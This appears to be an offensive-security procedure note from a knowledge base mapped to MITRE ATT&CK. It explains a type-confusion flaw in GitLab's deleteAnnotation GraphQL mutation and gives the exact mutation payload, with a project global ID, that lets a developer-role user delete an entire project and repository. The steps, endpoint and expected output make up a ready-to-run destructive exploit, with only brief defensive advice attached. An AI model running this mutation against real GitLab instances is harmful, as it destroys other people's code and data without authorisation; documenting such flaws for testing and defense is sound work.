---
tags:
  - graphql
  - type-confusion
  - deletion
type: procedure
tools:
  - '[[tools/GraphQL-Explorer]]'
tactics:
  - '[[Privilege Escalation]]'
commands:
  - '[[commands/deleteAnnotation-Project-Mutation]]'
verified: false
platforms:
  - Web
  - GitLab
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Exploitation for Privilege Escalation]]'
updated_at: '2025-12-14T17:29:20.441Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: dd50bc26-33db-4b1e-a815-d1745aff60d5
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Exploitation for Privilege Escalation]]'
---
# Execute-deleteAnnotation-Mutation-on-Project

## Summary

This procedure exploits the type confusion in GitLab's deleteAnnotation GraphQL mutation by supplying a project global ID, allowing a developer to delete the entire project and repository.

## Description

The vulnerability stems from the find_object method in app/graphql/mutations/metrics/dashboard/annotations/base.rb lacking type validation, and DeleteService's permission check (Ability.allowed?(user, :delete_metrics_dashboard_annotation, object)) applying without confirming the object is an annotation. By crafting a mutation with gid://GitLab/Project/<id>, the developer bypasses intended scopes. Target: GitLab GraphQL API. Expected outcome: Project deletion.

## Requirements

1. Developer role on the target project
2. Access to GraphQL Explorer or API endpoint
3. Project global ID (e.g., from project settings)

## Defense

Defensive measures and detection strategies:

- Implement strict type validation in GraphQL resolvers
- Audit GraphQL mutations for anomalous GIDs
- Enable detailed API logging and monitor for delete operations

## Objectives

1. Trigger unauthorized project deletion via type confusion
2. Demonstrate escalation from annotation to project scope
3. Validate vulnerability in controlled environment

## Instructions

### Step 1: Access GraphQL Explorer

**Context**: Log in as developer user and navigate to the GraphQL interface.

**Command** (Browser):

Open http://gitlab.example.vm/-/graphql-explorer

> Ensure authenticated session.

### Step 2: Execute Mutation

**Context**: Input the deleteAnnotation mutation with project GID to exploit the flaw.

**Command** ([[commands/deleteAnnotation-Project-Mutation]]):
```graphql
mutation { deleteAnnotation(input: {id: "gid://GitLab/Project/<project-id>"}) { clientMutationId } }
```

> Replace <project-id> with actual ID. Expected output: {"data":{"deleteAnnotation":{"clientMutationId":null}}}

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Exploitation for Privilege Escalation]]

### Sub-Techniques


## Commands Used

- [[commands/deleteAnnotation-Project-Mutation]]

## Tools Used

- [[tools/GraphQL-Explorer]]

## Tags

- graphql
- type-confusion
- deletion
